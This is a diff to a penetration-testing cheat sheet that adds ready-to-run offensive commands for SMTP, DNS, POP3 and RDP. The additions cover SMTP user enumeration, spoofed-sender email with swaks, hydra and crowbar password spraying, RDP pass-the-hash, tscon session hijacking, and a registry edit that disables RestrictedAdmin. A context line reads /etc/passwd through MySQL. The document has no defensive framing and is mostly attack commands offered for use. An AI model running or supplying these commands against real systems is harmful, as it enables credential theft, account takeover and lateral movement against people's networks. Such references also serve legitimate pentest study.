@@ -144,11 +144,15 @@ $ telnet <IP address>
 ```
 $ telnet <IP address> 25
 VRFY root
+$ smtp-user-enum -M RCPT -U <usernames.txt> -D <domain.tld> -t <IP address>
 ```
 
 - DNS (udp/port 53)
 
 ```
+$ host <domain.tld>
+$ host -t MX <domain.tld>
+$ host -t A <domain.tld>
 $ dig ns <domain.tld> @<nameserver>
 $ dig mx <domain.tld> @<nameserver>
 $ dig txt <domain.tld> @<nameserver>
@@ -159,6 +163,8 @@ $ dig axfr <domain.tld> @<nameserver>
 $ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain.tld> @<nameserver> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
 $ dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain.tld>
 $ for i in $(cat subdomainlist.txt);do host $i | grep "has address" | grep <Target Domain Name> | cut -d" " -f4 >> ip-addresses.txt;done
+$ subfinder -d <domain.tld> -v
+$ swaks --from <email address> --to <email address> --header 'Subject: Notification' --body 'Message' --server <IP address>
 ```
 
 - TFTP (udp/port 69)
@@ -207,6 +213,7 @@ USER admin
 PASS admin
 LIST
 RETR 1
+$ hydra -L <usernames.txt> -p '<password>' -f <IP address> pop3
 ```
 
 - RPCBIND (port 111)
@@ -414,8 +421,14 @@ MySQL [(none)]> select LOAD_FILE("/etc/passwd");
 $ xfreerdp /v:<IP address>
 $ xfreerdp /v:<IP address> /u:Administrator
 $ xfreerdp /v:<IP address> /u:Administrator /d:<Domain>
+$ xfreerdp /v:<IP address>  /u:Administrator /pth:<hash>
 $ freerdp /v:<IP address> /cert:ignore /u:Administrator /p:'<password>'
+$ rdesktop -u <username> -p <password> <IP address>
 $ rdp-sec-check.pl <IP address>
+$ tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+$ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+$ crowbar -b rdp -s <IP address CIDR> -U <usernames.txt> -c '<password>'
+$ hydra -L <usernames.txt> -p '<password>' <IP address> rdp
 ```
 
 - PostgreSQL (port 5432)
